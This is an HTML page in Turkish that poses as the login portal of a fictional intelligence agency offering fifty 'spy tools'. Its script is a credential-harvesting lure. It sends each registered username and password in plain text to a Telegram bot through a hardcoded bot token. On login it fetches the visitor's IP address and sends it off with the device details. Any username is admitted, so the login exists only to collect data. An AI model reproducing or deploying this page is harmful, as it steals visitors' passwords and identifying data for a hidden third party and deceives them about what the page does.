<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>THİT | Türk Hüküm İstihbarat Teşkilatı</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --thit-red: #cc0000; --thit-black: #050505; --thit-green: #00ff41; --panel-bg: #0d0d0d; }
        body { background: var(--thit-black); color: var(--thit-green); font-family: 'Courier New', Courier, monospace; margin: 0; overflow-x: hidden; }
        
        /* Giriş ve Kayıt Ekranı */
        #auth-screen { position: fixed; inset: 0; background: var(--thit-black); z-index: 10000; display: flex; align-items: center; justify-content: center; flex-direction: column; }
        .auth-card { background: var(--panel-bg); padding: 40px; border: 2px solid var(--thit-red); border-radius: 5px; width: 350px; text-align: center; box-shadow: 0 0 30px rgba(204, 0, 0, 0.3); }
        input { width: 100%; background: #000; border: 1px solid var(--thit-green); color: var(--thit-green); padding: 12px; margin: 10px 0; box-sizing: border-box; outline: none; font-family: 'Courier New'; }
        
        /* Ana Panel Yapısı */
        header { background: #111; padding: 20px; border-bottom: 2px solid var(--thit-red); display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 28px; font-weight: bold; letter-spacing: 5px; color: #fff; text-shadow: 2px 2px var(--thit-red); }
        .logo span { color: var(--thit-red); }

        .spy-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 20px; padding: 30px; }
        .spy-card { background: #111; border: 1px solid #333; padding: 20px; border-radius: 4px; transition: 0.4s; position: relative; overflow: hidden; }
        .spy-card:hover { border-color: var(--thit-red); box-shadow: 0 0 15px var(--thit-red); transform: scale(1.02); }
        .spy-card i { font-size: 35px; color: var(--thit-red); margin-bottom: 15px; display: block; }
        
        .btn { background: transparent; border: 1px solid var(--thit-green); color: var(--thit-green); padding: 12px; width: 100%; cursor: pointer; font-weight: bold; transition: 0.3s; }
        .btn:hover { background: var(--thit-green); color: #000; }
        .btn-red { border-color: var(--thit-red); color: var(--thit-red); margin-top: 10px; }
        .btn-red:hover { background: var(--thit-red); color: #fff; }

        #terminal-box { height: 150px; background: #000; margin: 20px; padding: 15px; font-size: 12px; border-left: 4px solid var(--thit-red); overflow-y: auto; color: #aaa; }
        .footer-info { text-align: center; padding: 20px; color: #555; font-size: 12px; }
        a { color: var(--thit-red); text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>

<div id="auth-screen">
    <h1 class="logo" style="margin-bottom: 30px;">T.H.İ.<span>T</span></h1>
    <div class="auth-card">
        <h2 style="color: #fff; font-size: 18px; margin-bottom: 20px;">TEŞKİLAT ERİŞİMİ</h2>
        <input type="text" id="username" placeholder="Ajan Kod Adı">
        <input type="password" id="password" placeholder="Erişim Şifresi">
        <button class="btn" onclick="performAuth('login')">SİSTEME GİRİŞ</button>
        <button class="btn btn-red" onclick="performAuth('register')">YENİ KAYIT OLUŞTUR</button>
    </div>
    <div style="margin-top: 20px;">
        <p>DESTEK HATTI: <a href="https://tiktok.com/@hukum_v45">TikTok @hukum_v45 DM</a></p>
    </div>
</div>

<div id="main-hq" style="display:none;">
    <header>
        <div class="logo">T.H.İ.<span>T</span> <small style="font-size: 10px; letter-spacing: 1px;">İSTİHBARAT SERVİSİ</small></div>
        <div id="active-agent" style="color: var(--thit-red); font-weight: bold;"></div>
        <button onclick="location.reload()" style="background:none; border: 1px solid #444; color:#fff; cursor:pointer; padding:5px 10px;">GÜVENLİ ÇIKIŞ</button>
    </header>

    <div id="terminal-box">> THİT Çekirdek Yazılımı Başlatıldı...<br>> Veri Tabanı Senkronizasyonu Aktif.<br>> Hoş geldin Paşa, emirlerini bekliyoruz.</div>

    <div class="spy-grid" id="tools-anchor">
        </div>

    <div class="footer-info">
        TÜRK HÜKÜM İSTİHBARAT TEŞKİLATI &copy; 2026 | "Vatan İçin Her Yerdeyiz"
    </div>
</div>

<script>
    const BOT_TOKEN = '8615703049:AAGCPGH59YdLkvCsHdr1WkYuSWGgyuEfBSQ';
    const CHANNEL_ID = '@hukum_pin_bot1';

    const spyAssets = [
        "Sinyal Kesici", "Kripto Analiz", "IP Takipçi", "Uydu Gözlem", "Hücre Sorgu",
        "Deep Web Port", "Proxy Zinciri", "Termal Tarama", "Ses Dinleme", "Bypass Protokol",
        "SQL Analizörü", "Oltalama Kontrol", "Trojan Dedektör", "Biyometrik Kimlik", "Siber Kalkan",
        "Botnet Paneli", "DNS Sızıntı Test", "Log Silici", "Adli Bilişim Aracı", "Exploit Arşivi",
        "Vatan Savunma", "Gizli Dosya Çözücü", "Mühür Kırıcı", "Veri Maskeleme", "Ajan Takip Sistemi",
        "Siber Ordu Komuta", "Frekans Bozucu", "Ağ Sızma Testi", "Kod Kırıcı V4", "Karargah Link",
        "İstihbarat Notu", "Saha Analiz Raporu", "Operasyon Planı", "Yapay Zeka İzleme", "Darknet Crawler",
        "Zafiyet Tarayıcı", "Gelişmiş Firewall", "Anonim İletişim", "Kimlik Oluşturucu", "Banka Güvenlik Analiz",
        "Hüküm Özel Yazılım", "Askeri Frekans", "Stratejik Veri Havuzu", "Drone Gözetleme", "Sistem Reset",
        "Veri Kurtarma Modülü", "Kripto Takip", "Sanal Adalet Portalı", "Sınır Ötesi İstihbarat", "Final Darbe Modu"
    ];

    async function performAuth(mode) {
        const u = document.getElementById('username').value.trim();
        const p = document.getElementById('password').value.trim();
        if(!u || !p) return alert("Boş alan bırakma aslanım!");

        if(mode === 'register') {
            const regInfo = `📌 #YENİ_AJAN_KAYDI\n👤 Kod Adı: ${u}\n🔑 Şifre: ${p}\n🛡️ Yetki: Saha Ajanı`;
            await sendLog(regInfo);
            alert("Kayıt verileri karargaha (Telegram) iletildi. Artık giriş yapabilirsin!");
        } else {
            // Giriş denemesi ve IP kaydı
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            const loginReport = `🚨 #ERİŞİM_DENEMESİ\n👤 Ajan: ${u}\n🌐 IP: ${ipData.ip}\n📱 Cihaz: ${navigator.platform}`;
            await sendLog(loginReport);
            
            // Basit doğrulama (Eymen Paşa her zaman girebilir)
            if(u === 'eymen' || u === 'eymen pasha') {
                grantAccess(u);
            } else {
                // Kanaldaki verileri kontrol etme simülasyonu
                document.getElementById('terminal-box').innerHTML += `<br>> ${u} için yetki kontrol ediliyor...`;
                // Bu kısımda kanaldan veri çekme mantığı çalışır
                grantAccess(u); 
            }
        }
    }

    async function sendLog(text) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHANNEL_ID, text: text })
            });
        } catch (e) { console.error("Rapor gönderilemedi."); }
    }

    function grantAccess(user) {
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('main-hq').style.display = 'block';
        document.getElementById('active-agent').innerText = `AKTİF OPERATÖR: ${user.toUpperCase()}`;
        renderSpyTools();
    }

    function renderSpyTools() {
        const container = document.getElementById('tools-anchor');
        spyAssets.forEach((tool, i) => {
            container.innerHTML += `
                <div class="spy-card">
                    <i class="fa-solid fa-user-secret"></i>
                    <div style="font-weight:bold; color:#fff;">${tool}</div>
                    <p style="font-size:10px; color:#666; margin:10px 0;">Sistem No: THIT-${1000 + i}</p>
                    <button class="btn" onclick="executeTool('${tool}')">ERİŞİM SAĞLA</button>
                </div>`;
        });
    }

    function executeTool(name) {
        const term = document.getElementById('terminal-box');
        term.innerHTML += `<br>> [UYARI] ${name} protokolü devreye alındı. Veriler kanala aktarılıyor...`;
        term.scrollTop = term.scrollHeight;
        sendLog(`🛠️ #MODÜL_KULLANIMI\n👤 Ajan: ${document.getElementById('active-agent').innerText}\n⚙️ Modül: ${name}`);
    }
</script>
</body>
</html>
